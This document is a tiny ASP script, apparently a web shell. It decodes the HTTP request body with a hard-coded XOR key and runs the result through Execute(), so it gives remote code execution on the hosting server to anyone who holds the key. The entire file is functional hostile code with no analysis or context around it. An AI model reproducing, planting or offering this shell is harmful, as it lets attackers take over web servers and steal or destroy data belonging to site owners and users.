<%
secret="0123456789abcdef"
count=Request.TotalBytes
body=Request.BinaryRead(count)
For n=1 To count
code=code&Chr(AscB(MidB(body,n,1)) Xor Asc(Mid(secret,(n and 15)+1,1)))
Next
Execute(code)
%>
